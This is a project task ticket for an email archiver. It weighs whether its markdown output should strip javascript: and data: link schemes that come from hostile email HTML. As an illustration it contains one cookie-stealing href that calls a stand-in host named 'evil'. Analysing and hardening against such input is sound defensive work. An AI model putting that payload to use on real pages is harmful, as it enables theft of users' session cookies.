---
title: 'Decide what the markdown sink should do with javascript: and data: hrefs'
date: "2026-08-20"
time: "16:45:26"
tags:
    - security
    - sinks
summary: Hostile hrefs survive into archived .md links; inert here, live for a permissive downstream renderer
type: task
status: todo
effort: S
epic: storage-sinks
---

Found in the 2026-08-20 standards-pass sweep. Deferred: it is a scope question before it is a code change.

## What is true today
`internal/sink/markdown.go:219` converts `msg.HTMLBody` — fully attacker-controlled — through `htmltomarkdown.ConvertString`.

The dangerous part is already handled. In the vendored `html-to-markdown/v2@v2.5.2`, `plugin/base/base.go:31-38` registers `script`, `style`, `iframe`, `noscript`, `link`, `meta`, `input` and `textarea` as `TagTypeRemove`, and `preRenderRemove` deletes each tag *and its text content* before rendering. No production renderer emits raw HTML. Hostile markup does not survive as markup.

What does survive is the URL. `converter/url.go:37-75` percent-encodes only the characters that would break markdown syntax; there is no scheme allow-list, and the `data:` branch exists specifically to preserve it. So:

    <a href="javascript:fetch('https://evil/?c='+document.cookie)">Click</a>

lands in the archive as a literal `[Click](javascript:...)`.

## Why this is deferred and not fixed
It is inert everywhere mail-muncher can see. The tool never renders the markdown, and an agent reading the `.md` as text does not execute a href. The exposure needs a downstream consumer that renders the archive to clickable HTML without sanitizing — something mail-muncher does not control and does not currently claim to protect against. `docs/output-format.md` already frames the markdown as a reading format, not a fidelity format.

So the decision is which of these the project wants to stand behind:

1. Strip or neutralize non-`http(s)`/`mailto` schemes in the sink. Safest, and a small change. Costs a little fidelity for anyone who legitimately wants the original href.
2. Leave the behavior and document it explicitly in `docs/output-format.md` under the sharp-edges heading, so a consumer building a renderer knows to sanitize. Cheapest, and consistent with how the docs already treat the format's other sharp edges.

Option 2 is probably right for a read-only archiver, but it should be a decision on the record rather than an accident of the library's defaults.

## Test gap worth noting either way
`internal/sink/hostile_test.go` reads like it would cover this and does not — per its own header it is entirely about local filesystem symlink safety, not about email content. There is no test today asserting what the sink does with a hostile body. Whichever option is chosen should come with one.
